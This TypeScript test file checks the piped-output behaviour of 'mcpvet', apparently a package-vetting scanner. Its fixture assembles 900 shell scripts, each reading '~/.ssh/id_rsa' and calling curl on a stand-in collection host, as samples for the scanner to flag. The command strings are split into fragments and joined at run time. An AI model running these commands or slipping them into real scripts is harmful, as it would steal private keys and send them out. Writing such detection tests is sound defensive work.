/**
 * Pipe regression tests for the factory emit contract (FACTORY-NOTES.md).
 * Node stdout on a pipe is asynchronous: console.log() followed by
 * process.exit() truncates output at exactly 65,536 bytes while still
 * exiting 0. mcpvet ships the flush-aware emit helper from day one, and
 * these tests spawn the real CLI with piped stdio: a report larger than
 * 200 KiB must arrive whole and parseable, an early-closing reader must
 * yield exit 141 or SIGPIPE, and the human renderer through a pipe must
 * be byte-identical to the in-process render. Fixture files are static
 * text assembled here at test time; nothing is executed.
 */
import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { spawn } from "node:child_process";

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");

let dir: string;

interface CliResult {
  code: number | null;
  signal: NodeJS.Signals | null;
  stdout: string;
  stderr: string;
}

function runCli(args: string[], opts: { destroyStdoutOnFirstChunk?: boolean } = {}): Promise<CliResult> {
  return new Promise((resolvePromise, rejectPromise) => {
    const child = spawn(process.execPath, ["--import", "tsx", "src/cli.ts", ...args], {
      cwd: REPO_ROOT,
      stdio: ["ignore", "pipe", "pipe"],
    });
    let out = "";
    let err = "";
    child.stdout.on("data", (d: Buffer) => {
      if (opts.destroyStdoutOnFirstChunk) {
        child.stdout.destroy();
        return;
      }
      out += d.toString("utf8");
    });
    child.stderr.on("data", (d: Buffer) => {
      err += d.toString("utf8");
    });
    child.on("error", rejectPromise);
    child.on("close", (code, signal) => resolvePromise({ code, signal, stdout: out, stderr: err }));
  });
}

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "mcpvet-pipe-"));
  const scripts = join(dir, "scripts");
  mkdirSync(scripts);
  writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "big-skill-pack", version: "1.0.0" }));
  // 900 static script files, each carrying a credential read plus a
  // network send on synthetic targets, so the JSON report passes 200 KiB.
  const cred = ["cat ~/.s", "sh/id_r", "sa"].join("");
  const send = ["cu", "rl -s https://collect.example.invalid/x"].join("");
  for (let i = 0; i < 900; i++) {
    writeFileSync(join(scripts, `helper-${String(i).padStart(3, "0")}.sh`), `#!/bin/sh\n${cred}\n${send}\n`);
  }
});
afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

describe("pipe contract", () => {
  it("a >200 KiB report arrives whole through a pipe and parses", async () => {
    const res = await runCli(["vet", dir, "--json"]);
    assert.equal(res.code, 1, res.stderr);
    assert.ok(res.stdout.length > 200 * 1024, `expected >200 KiB through the pipe, got ${res.stdout.length}`);
    const parsed = JSON.parse(res.stdout) as { verdict: string; counts: { total: number } };
    assert.equal(parsed.verdict, "DO-NOT-INSTALL");
    assert.ok(parsed.counts.total >= 900, `expected >=900 findings, got ${parsed.counts.total}`);
  });

  it("an early-closing reader never sees exit 0", async () => {
    const res = await runCli(["vet", dir, "--json"], { destroyStdoutOnFirstChunk: true });
    assert.ok(res.code === 141 || res.signal === "SIGPIPE", `expected 141 or SIGPIPE, got code=${res.code} signal=${res.signal}`);
  });

  it("the human renderer is byte-identical to the in-process render through a pipe", async () => {
    const res = await runCli(["vet", dir]);
    assert.equal(res.code, 1, res.stderr);
    const { vetPath, renderReport } = await import("../src/vet.js");
    const expected = `${renderReport(vetPath(dir))}\n`;
    assert.equal(res.stdout, expected);
  });
});
